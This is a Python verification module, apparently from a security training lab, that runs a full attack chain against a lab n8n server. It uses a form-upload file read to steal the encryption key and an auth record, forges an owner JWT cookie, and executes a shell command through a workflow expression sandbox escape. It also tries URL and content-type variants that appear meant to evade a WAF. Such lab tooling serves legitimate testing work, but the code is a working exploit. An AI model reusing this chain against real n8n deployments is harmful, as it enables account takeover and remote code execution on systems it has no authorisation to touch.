"""Constrained active verification for the Gym 003 n8n target.

This module is intentionally not a general-purpose exploit client.  Every network
destination, route, file path, workflow body, and command is a module constant.
Callers can only supply runtime bookkeeping such as the evidence directory and
timeout.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import http.client
import json
import os
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit


SCENARIO = "supplier-intake"
INGRESS = "http://bunkerweb:8080"
VIRTUAL_HOST = "supplier.intake.test"
FORM_PATH = "/form/supplier-intake"
FIXED_CONFIG_PATH = "/home/node/.n8n/config"
FIXED_AUTH_CAPSULE_PATH = "/tmp/gym-003-auth.json"
FIXED_COMMAND = "printf gym-003-rce-ok"
RCE_MARKER = "gym-003-rce-ok"
DIRTY_FILE = ".probe-dirty.json"

CONTENT_TYPE_VARIANTS = (
    "application/json",
    "Application/JSON; charset=utf-8",
    "application/json;charset=UTF-8",
)
ROUTE_VARIANTS = (
    FORM_PATH,
    FORM_PATH + "?source=gym003",
    "/FORM/supplier-intake",
    "/form/%73upplier-intake",
    "/form/supplier%2Dintake",
    "/form/supplier-intake%2F",
    "/form/./supplier-intake",
    "/form//supplier-intake",
    "/form/supplier-intake/",
)


class ProbeError(RuntimeError):
    """Expected verification failure with a safe user-facing message."""


@dataclass
class FixedHTTPSession:
    """Small cookie-aware client locked to the scenario ingress."""

    timeout: float
    cookies: dict[str, str] = field(default_factory=dict)

    def request(
        self,
        method: str,
        path: str,
        *,
        body: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, dict[str, str], bytes]:
        parsed = urlsplit(INGRESS)
        connection = http.client.HTTPConnection(parsed.hostname, parsed.port, timeout=self.timeout)
        request_headers = {
            "Host": VIRTUAL_HOST,
            "User-Agent": "gym-003-reviewed-probe/1.0",
            "Accept": "application/json, application/octet-stream;q=0.9, */*;q=0.1",
            "Connection": "close",
        }
        if self.cookies:
            request_headers["Cookie"] = "; ".join(f"{key}={value}" for key, value in self.cookies.items())
        if headers:
            request_headers.update(headers)

        try:
            connection.request(method, path, body=body, headers=request_headers)
            response = connection.getresponse()
            response_body = response.read()
            response_headers = {key.lower(): value for key, value in response.getheaders()}
            for header, value in response.getheaders():
                if header.lower() != "set-cookie":
                    continue
                pair = value.split(";", 1)[0]
                if "=" in pair:
                    key, cookie_value = pair.split("=", 1)
                    self.cookies[key] = cookie_value
            return response.status, response_headers, response_body
        finally:
            connection.close()


def _validated_context(context: dict[str, Any]) -> tuple[Path, float]:
    if context.get("scenario", SCENARIO) != SCENARIO:
        raise ProbeError("unknown scenario")
    if context.get("ingress", INGRESS) != INGRESS:
        raise ProbeError("the verification target is fixed server-side")
    if context.get("host", VIRTUAL_HOST) != VIRTUAL_HOST:
        raise ProbeError("the verification virtual host is fixed server-side")
    timeout = float(context.get("timeout", 15))
    if not 1 <= timeout <= 60:
        raise ProbeError("timeout must be between 1 and 60 seconds")
    evidence_dir = Path(context.get("evidence_dir", "/var/lib/gym/evidence"))
    return evidence_dir, timeout


def _unwrap_json(body: bytes) -> Any:
    parsed = json.loads(body.decode("utf-8"))
    if isinstance(parsed, dict) and set(parsed) == {"data"}:
        return parsed["data"]
    return parsed


def _json_request(
    session: FixedHTTPSession,
    method: str,
    path: str,
    payload: dict[str, Any] | None = None,
) -> tuple[int, Any]:
    body = None if payload is None else json.dumps(payload, separators=(",", ":")).encode()
    status, _, response = session.request(
        method,
        path,
        body=body,
        headers={"Content-Type": "application/json"} if body is not None else None,
    )
    try:
        decoded = _unwrap_json(response) if response else None
    except (UnicodeDecodeError, json.JSONDecodeError):
        decoded = None
    return status, decoded


def _read_file(
    session: FixedHTTPSession,
    path: str,
    *,
    route: str = FORM_PATH,
    content_type: str = "application/json",
) -> tuple[int, bytes]:
    # The field name and metadata match the reviewed, pre-seeded form.  Neither
    # the route nor path comes from a job request.
    payload = {
        "data": {},
        "files": {
            "field-0": {
                "filepath": path,
                "originalFilename": "supplier-document.bin",
                "mimetype": "application/octet-stream",
                "size": 64,
            }
        },
    }
    status, _, body = session.request(
        "POST",
        route,
        body=json.dumps(payload, separators=(",", ":")).encode(),
        headers={"Content-Type": content_type},
    )
    return status, body


def _extract_auth_capsule(capsule_bytes: bytes) -> tuple[str, str]:
    """Return the two short JWT claims written by the trusted target bootstrap."""

    try:
        capsule = json.loads(capsule_bytes.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise ProbeError("the fixed authentication capsule was malformed") from exc
    if isinstance(capsule, list) and len(capsule) == 1:
        capsule = capsule[0]
    if not isinstance(capsule, dict):
        raise ProbeError("the fixed authentication capsule was malformed")
    user_id = capsule.get("id")
    auth_hash = capsule.get("hash")
    if not all(isinstance(value, str) and 1 <= len(value) <= 256 for value in (user_id, auth_hash)):
        raise ProbeError("the fixed authentication capsule lacked valid claims")
    return user_id, auth_hash


def _jwt_secret(config_bytes: bytes) -> str:
    try:
        config = json.loads(config_bytes.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise ProbeError("the copied n8n configuration was malformed") from exc
    secret = config.get("encryptionKey") if isinstance(config, dict) else None
    if not isinstance(secret, str) or not secret:
        raise ProbeError("the copied n8n configuration lacked an encryption key")
    # n8n 1.65.0 JwtService derives the fallback secret from every other
    # character of InstanceSettings.encryptionKey, then hashes that base key.
    # This mirrors the official source exactly; the raw key never leaves memory.
    return hashlib.sha256(secret[::2].encode()).hexdigest()


def _b64url(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")


def _forge_owner_cookie(identity: tuple[str, str], secret: str) -> str:
    user_id, auth_hash = identity
    now = int(time.time())
    header = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = _b64url(
        json.dumps(
            {"id": user_id, "hash": auth_hash, "iat": now, "exp": now + 300},
            separators=(",", ":"),
        ).encode()
    )
    signing_input = f"{header}.{payload}".encode()
    signature = _b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
    return f"{header}.{payload}.{signature}"


def _verification_workflow() -> dict[str, Any]:
    expression = (
        "={{ (function(){ return this.process.mainModule.require('child_process')"
        ".execSync('printf gym-003-rce-ok').toString(); })() }}"
    )
    return {
        "name": f"Gym 003 verification {uuid.uuid4().hex[:12]}",
        "active": False,
        "nodes": [
            {
                "parameters": {},
                "id": "91b52f55-3c28-4cdb-8b66-e5e784496401",
                "name": "Manual Trigger",
                "type": "n8n-nodes-base.manualTrigger",
                "typeVersion": 1,
                "position": [0, 0],
            },
            {
                "parameters": {
                    "values": {"string": [{"name": "proof", "value": expression}]},
                    "options": {},
                },
                "id": "a77ab015-a4f4-4b0e-8ad9-447330bbca3b",
                "name": "Evaluate fixed proof",
                "type": "n8n-nodes-base.set",
                "typeVersion": 1,
                "position": [240, 0],
            },
        ],
        "connections": {
            "Manual Trigger": {
                "main": [[{"node": "Evaluate fixed proof", "type": "main", "index": 0}]]
            }
        },
        "settings": {"executionOrder": "v1"},
    }


def _find_marker(value: Any) -> bool:
    if isinstance(value, str):
        stripped = value.strip()
        if stripped == RCE_MARKER:
            return True
        # n8n 1.65 serializes execution data as a JSON string in the REST
        # response. Decode only bounded containers; the marker must still be an
        # exact leaf value, so the authored expression cannot count as proof.
        if len(stripped) <= 5_000_000 and stripped[:1] in {"{", "["}:
            try:
                return _find_marker(json.loads(stripped))
            except json.JSONDecodeError:
                return False
        return False
    if isinstance(value, dict):
        return any(_find_marker(item) for item in value.values())
    if isinstance(value, list):
        return any(_find_marker(item) for item in value)
    return False


def _dirty_path(context: dict[str, Any]) -> Path:
    state_dir = Path(context.get("state_dir", "/var/lib/gym/state"))
    return state_dir / SCENARIO / DIRTY_FILE


def _write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_suffix(path.suffix + ".tmp")
    temporary.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    temporary.replace(path)


def _evidence_path(evidence_dir: Path) -> Path:
    run_id = uuid.uuid4().hex
    return evidence_dir / SCENARIO / "verify" / f"{run_id}.json"


def _safe_response_fingerprint(body: bytes) -> dict[str, Any]:
    return {"bytes": len(body), "sha256": hashlib.sha256(body).hexdigest()}


def verify(context: dict[str, Any]) -> dict[str, Any]:
    from .operation_lock import exclusive_operation

    state_dir = Path(context.get("state_dir", "/var/lib/gym/state"))
    with exclusive_operation(state_dir):
        return _verify_locked(context)


def _verify_locked(context: dict[str, Any]) -> dict[str, Any]:
    """Verify the fixed scenario with a new unauthenticated HTTP session.

    A dirty marker blocks all later attempts.  It is created immediately after
    the temporary workflow is created and removed only after n8n confirms its
    deletion.
    """

    evidence_dir, timeout = _validated_context(context)
    dirty_path = _dirty_path(context)
    if dirty_path.exists():
        return {
            "verdict": "inconclusive",
            "evidence": [],
            "cleanup": {"status": "dirty", "detail": "scenario reset required"},
            "error": "a previous verification failed to remove its workflow",
        }

    session = FixedHTTPSession(timeout=timeout)
    evidence: dict[str, Any] = {
        "scenario": SCENARIO,
        "target": VIRTUAL_HOST,
        "fresh_session": True,
        "probe": "CVE-2026-21858 -> CVE-2025-68613",
        "fixed_command": FIXED_COMMAND,
        "steps": [],
        "variant_observations": [],
    }
    verdict = "inconclusive"
    cleanup: dict[str, Any] = {"status": "not_needed"}
    workflow_id: str | None = None

    try:
        variants = [(FORM_PATH, content_type) for content_type in CONTENT_TYPE_VARIANTS]
        variants.extend((route, "application/json") for route in ROUTE_VARIANTS[1:])
        successful_variant: tuple[str, str, bytes, str] | None = None
        for route, content_type in variants:
            config_status, config_body = _read_file(
                session, FIXED_CONFIG_PATH, route=route, content_type=content_type
            )
            file_read_confirmed = False
            candidate_secret = ""
            if config_status == 200:
                try:
                    candidate_secret = _jwt_secret(config_body)
                    file_read_confirmed = True
                except ProbeError:
                    pass
            evidence["variant_observations"].append(
                {
                    "route": route,
                    "content_type": content_type,
                    "status": config_status,
                    "file_read_confirmed": file_read_confirmed,
                    **_safe_response_fingerprint(config_body),
                }
            )
            if successful_variant is None and file_read_confirmed:
                successful_variant = (route, content_type, config_body, candidate_secret)

        if successful_variant is None:
            statuses = [item["status"] for item in evidence["variant_observations"]]
            verdict = (
                "blocked_by_waf"
                if any(status in (401, 403, 406, 415) for status in statuses)
                else "not_reproduced"
            )
            raise ProbeError("all fixed file-read variants were rejected")

        successful_route, successful_content_type, config_body, secret = successful_variant
        evidence["steps"].append(
            {
                "name": "fixed_config_read",
                "status": 200,
                "route": successful_route,
                "content_type": successful_content_type,
                **_safe_response_fingerprint(config_body),
            }
        )
        verdict = "confirmed_file_read"

        capsule_status, capsule_body = _read_file(
            session,
            FIXED_AUTH_CAPSULE_PATH,
            route=successful_route,
            content_type=successful_content_type,
        )
        evidence["steps"].append(
            {
                "name": "fixed_auth_capsule_read",
                "status": capsule_status,
                **_safe_response_fingerprint(capsule_body),
            }
        )
        if capsule_status != 200:
            raise ProbeError(
                f"the authentication-capsule prerequisite returned HTTP {capsule_status}"
            )
        owner = _extract_auth_capsule(capsule_body)

        # Authentication is derived only from this run's two file reads.  The
        # session begins empty and never uses bootstrap/staff credentials.
        session.cookies["n8n-auth"] = _forge_owner_cookie(owner, secret)
        workflow = _verification_workflow()
        create_status, created = _json_request(session, "POST", "/rest/workflows", workflow)
        if create_status not in (200, 201) or not isinstance(created, dict) or not created.get("id"):
            raise ProbeError(f"temporary workflow creation returned HTTP {create_status}")
        workflow_id = str(created["id"])
        _write_json(dirty_path, {"workflow_id": workflow_id, "created_at": int(time.time())})
        evidence["steps"].append({"name": "temporary_workflow_created", "status": create_status})

        run_status, run_result = _json_request(
            session,
            "POST",
            f"/rest/workflows/{workflow_id}/run?partialExecutionVersion=-1",
            {"workflowData": created, "runData": {}},
        )
        evidence["steps"].append({"name": "fixed_expression_executed", "status": run_status})
        if run_status not in (200, 201) or not isinstance(run_result, dict):
            raise ProbeError(f"temporary workflow execution returned HTTP {run_status}")

        marker_seen = _find_marker(run_result)
        execution_id = run_result.get("executionId")
        if not marker_seen and execution_id:
            deadline = time.monotonic() + timeout
            while time.monotonic() < deadline:
                execution_status, execution = _json_request(
                    session, "GET", f"/rest/executions/{execution_id}?includeData=true"
                )
                if execution_status == 200 and _find_marker(execution):
                    marker_seen = True
                    break
                if isinstance(execution, dict) and execution.get("finished"):
                    break
                time.sleep(0.2)
        if marker_seen:
            verdict = "confirmed_rce"
            evidence["steps"][-1]["marker"] = RCE_MARKER
        else:
            raise ProbeError("the fixed marker was not returned by workflow execution")

    except (OSError, TimeoutError, http.client.HTTPException) as exc:
        evidence["error"] = f"target request failed: {type(exc).__name__}"
        verdict = "inconclusive"
    except ProbeError as exc:
        evidence["error"] = str(exc)
    finally:
        if workflow_id:
            try:
                delete_status, _ = _json_request(session, "DELETE", f"/rest/workflows/{workflow_id}")
                if delete_status in (200, 204):
                    cleanup = {"status": "completed", "workflow_removed": True}
                    dirty_path.unlink(missing_ok=True)
                else:
                    cleanup = {"status": "failed", "http_status": delete_status}
            except (OSError, TimeoutError, http.client.HTTPException):
                cleanup = {"status": "failed", "detail": "target unavailable during cleanup"}
        if workflow_id and cleanup.get("status") != "completed":
            verdict = "inconclusive"
            evidence.setdefault("error", "temporary workflow cleanup was not confirmed")
        evidence["verdict"] = verdict
        evidence["cleanup"] = cleanup

    evidence_path = _evidence_path(evidence_dir)
    _write_json(evidence_path, evidence)
    return {
        "verdict": verdict,
        "evidence": [str(evidence_path)],
        "cleanup": cleanup,
        "error": evidence.get("error"),
    }


def reset_probe_state(context: dict[str, Any]) -> dict[str, Any]:
    from .operation_lock import exclusive_operation

    state_dir = Path(context.get("state_dir", "/var/lib/gym/state"))
    with exclusive_operation(state_dir):
        return _reset_probe_state_locked(context)


def _reset_probe_state_locked(context: dict[str, Any]) -> dict[str, Any]:
    """Remove recorded or discoverable probe workflows, then clear dirty state."""

    _, timeout = _validated_context(context)
    path = _dirty_path(context)
    recorded_id: str | None = None
    if path.exists():
        try:
            dirty = json.loads(path.read_text())
            recorded_id = str(dirty["workflow_id"])
        except (OSError, KeyError, TypeError, ValueError, json.JSONDecodeError) as exc:
            raise ProbeError(
                "dirty probe state is malformed; refusing an unverified reset"
            ) from exc
        allowed = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-"
        if not recorded_id or any(character not in allowed for character in recorded_id):
            raise ProbeError("dirty probe state contains an invalid workflow identifier")

    session = FixedHTTPSession(timeout=timeout)
    login_status, _ = _json_request(
        session,
        "POST",
        "/rest/login",
        {
            "email": os.environ.get("GYM_N8N_STAFF_EMAIL", "operator@gym.invalid"),
            "password": os.environ.get("GYM_N8N_STAFF_PASSWORD", "Gym003-DevelopmentOnly"),
        },
    )
    if login_status != 200:
        raise ProbeError(
            f"scenario reset could not authenticate for cleanup (HTTP {login_status})"
        )
    listing_status, listing = _json_request(session, "GET", "/rest/workflows?limit=250")
    if listing_status != 200 or not isinstance(listing, dict):
        raise ProbeError(
            f"scenario reset could not list workflows (HTTP {listing_status})"
        )
    rows = listing.get("data", [])
    if not isinstance(rows, list):
        raise ProbeError("scenario reset received a malformed workflow list")
    workflow_ids = {
        str(row["id"])
        for row in rows
        if isinstance(row, dict)
        and str(row.get("name", "")).startswith("Gym 003 verification ")
        and row.get("id")
    }
    if recorded_id:
        workflow_ids.add(recorded_id)
    removed = 0
    for workflow_id in sorted(workflow_ids):
        delete_status, _ = _json_request(
            session, "DELETE", f"/rest/workflows/{workflow_id}"
        )
        if delete_status not in (200, 204, 404):
            raise ProbeError(
                f"scenario reset could not remove workflow (HTTP {delete_status})"
            )
        if delete_status != 404:
            removed += 1
    path.unlink(missing_ok=True)
    return {
        "status": "reset",
        "dirty_marker_removed": recorded_id is not None,
        "workflow_removed": removed > 0,
        "workflows_removed": removed,
    }
